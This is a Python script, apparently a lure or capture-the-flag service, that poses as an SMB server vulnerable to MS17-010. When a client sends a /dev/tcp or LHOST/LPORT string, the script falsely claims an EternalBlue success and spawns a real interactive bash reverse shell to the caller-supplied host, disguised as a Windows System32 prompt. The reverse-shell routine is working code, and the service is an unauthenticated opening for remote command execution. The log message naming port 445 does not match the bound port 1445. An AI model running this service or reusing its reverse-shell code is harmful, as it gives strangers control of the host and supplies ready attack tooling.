import socket
import os
import threading
import pty
import re
import tempfile

HOST = "0.0.0.0"
PORT = 1445

def spawn_reverse_shell(lhost, lport):
    try:
        # Faux filesystem Windows
        os.chdir("/C/Windows/System32")

        # Création d'un rcfile Bash pour simuler Windows
        rcfile = tempfile.NamedTemporaryFile(delete=False, mode="w")
        rcfile.write(
            "export PS1='C:\\\\Windows\\\\System32> '\n"
            "shopt -s expand_aliases\n"
            "alias dir='ls'\n"
            "alias type='cat'\n"
            "alias cls='clear'\n"
            "alias whoami='echo NT AUTHORITY\\\\SYSTEM'\n"
            "alias ver='echo Microsoft Windows [Version 6.1.7601]'\n"
        )
        rcfile.close()

        # Connexion reverse shell
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((lhost, int(lport)))

        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)

        # Lancement du shell interactif avec rcfile custom
        pty.spawn(["/bin/bash", "--rcfile", rcfile.name, "-i"])

    except Exception:
        pass


def handle_client(conn, addr):
    try:
        conn.sendall(b"\x00SMBv1 Fake Server\n")

        data = conn.recv(4096).decode(errors="ignore")

        # Faux check MS17-010
        if "MS17-010" in data:
            conn.sendall(b"Host is likely VULNERABLE to MS17-010\n")

        # Détection payload reverse shell générique (Internet friendly)
        match = re.search(r'/dev/tcp/([0-9.]+)/(\d+)', data)
        if not match:
            match = re.search(r'LHOST=([0-9.]+)\s+LPORT=(\d+)', data)

        if match:
            lhost, lport = match.groups()
            conn.sendall(b"[*] EternalBlue exploit successful\n")

            threading.Thread(
                target=spawn_reverse_shell,
                args=(lhost, lport),
                daemon=True
            ).start()

    except Exception:
        pass
    finally:
        conn.close()


def main():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)

    print("[+] Fake SMB server listening on port 445")

    while True:
        conn, addr = s.accept()
        threading.Thread(
            target=handle_client,
            args=(conn, addr),
            daemon=True
        ).start()


if __name__ == "__main__":
    main()
